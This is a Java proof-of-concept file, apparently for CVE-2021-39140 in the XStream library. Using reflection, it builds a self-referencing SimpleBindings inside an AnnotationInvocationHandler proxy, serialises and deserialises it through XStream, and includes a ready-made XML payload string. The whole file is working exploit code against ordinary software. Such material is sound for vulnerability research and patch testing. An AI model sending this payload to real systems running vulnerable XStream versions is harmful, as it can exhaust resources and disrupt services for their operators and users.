package com.r17a.xstream.cve.linkedhashset;

import com.thoughtworks.xstream.XStream;

import javax.script.SimpleBindings;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.Iterator;
import java.util.LinkedHashSet;

public class CVE_2021_39140 {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        String xml = "<linked-hash-set>\n" +
                "  <sun.reflect.annotation.AnnotationInvocationHandler serialization='custom'>\n" +
                "    <sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "      <default>\n" +
                "        <memberValues class='javax.script.SimpleBindings'>\n" +
                "          <map class='javax.script.SimpleBindings' reference='..'/>\n" +
                "        </memberValues>\n" +
                "        <type>javax.xml.transform.Templates</type>\n" +
                "      </default>\n" +
                "    </sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "  </sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "</linked-hash-set>";
        XStream xstream = new XStream();
        String s = xstream.toXML(getPayloadObject());
        System.out.println(s);
        LinkedHashSet set = (LinkedHashSet) xstream.fromXML(s);
        System.out.println(set);
        Iterator iterator = set.iterator();
        while (iterator.hasNext()) {
            Object object = iterator.next();
            System.out.println(object);
            Field memberValues = object.getClass().getDeclaredField("memberValues");
            memberValues.setAccessible(true);
            Object object1 = memberValues.get(object);
            System.out.println(object1);
            Field map = object1.getClass().getDeclaredField("map");
            map.setAccessible(true);
            System.out.println(map.get(object1));
        }
    }

    public static LinkedHashSet getPayloadObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
        LinkedHashSet set = new LinkedHashSet();
        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        SimpleBindings simpleBindings = new SimpleBindings();
        Field map = SimpleBindings.class.getDeclaredField("map");
        map.setAccessible(true);
        map.set(simpleBindings, simpleBindings);
        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, simpleBindings);

        set.add(tempHandler);
        return set;
    }
}
